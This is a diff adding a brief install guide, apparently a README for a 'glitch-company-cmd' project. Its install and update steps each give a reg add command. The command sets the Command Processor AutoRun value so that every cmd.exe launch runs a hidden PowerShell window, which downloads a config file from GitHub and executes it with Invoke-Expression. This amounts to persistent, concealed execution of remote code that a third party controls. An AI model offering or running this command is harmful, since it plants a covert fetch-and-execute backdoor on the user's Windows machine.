@@ -1,0 +1,5 @@
+how to install
+(1)reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f /d "powershell -WindowStyle Hidden -Command \"$cfg=(Invoke-WebRequest 'https://raw.githubusercontent.com/GLITCHCOMPANY/glitch-company-cmd/main/config.txt').Content; Invoke-Expression $cfg\""--for installing
+  how to update or unistall
+(1)reg delete "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f --if want to delete
+  (2)reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f /d "powershell -WindowStyle Hidden -Command \"$cfg=(Invoke-WebRequest 'https://raw.githubusercontent.com/GLITCHCOMPANY/glitch-company-cmd/main/config.txt').Content; Invoke-Expression $cfg\"" --for update
